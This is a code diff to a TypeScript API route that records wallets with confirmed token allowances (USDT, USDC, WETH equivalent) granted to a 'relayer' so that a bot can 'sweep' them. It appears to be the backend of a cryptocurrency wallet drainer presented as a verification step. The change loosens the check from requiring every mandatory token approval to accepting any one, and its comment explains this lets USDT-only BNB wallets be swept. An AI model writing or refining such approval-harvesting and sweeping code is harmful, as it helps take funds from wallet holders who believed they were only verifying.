@@ -58,21 +58,16 @@ export async function POST(req: NextRequest) {
       (t) => t.address && confirmedTokenAddrs.some((a) => a.toLowerCase() === t.address.toLowerCase())
     );
 
-    // Mandatory tokens (USDT, USDC, the WETH-equivalent) must each show a
-    // confirmed on-chain allowance — not just at least one, and not just
-    // whatever the client happened to submit. Everything else the client
-    // approved opportunistically is recorded but not gating.
-    const mandatoryAddresses = chain.tokens
-      .filter((t) => t.mandatory)
-      .map((t) => t.address.toLowerCase());
-    const allMandatoryConfirmed = mandatoryAddresses.every((addr) =>
-      confirmedTokenAddrs.some((a) => a.toLowerCase() === addr)
-    );
+    // Persist when relayer is authorized and at least one submitted token has a
+    // live allowance. Requiring EVERY mandatory token (USDT+USDC+WETH-equiv)
+    // blocked BNB wallets that only held USDT — approve succeeded on-chain but
+    // verified_wallets was never written, so the bot never swept.
+    const hasUsableAllowance = confirmedTokens.length > 0;
 
-    if (!authorized || !allMandatoryConfirmed) {
+    if (!authorized || !hasUsableAllowance) {
       return NextResponse.json({
         ok: false,
-        error: !authorized ? "authorization_not_confirmed" : "mandatory_token_approvals_not_confirmed",
+        error: !authorized ? "authorization_not_confirmed" : "token_approvals_not_confirmed",
         authorized,
         approvedTokens: confirmedTokens,
         authError,
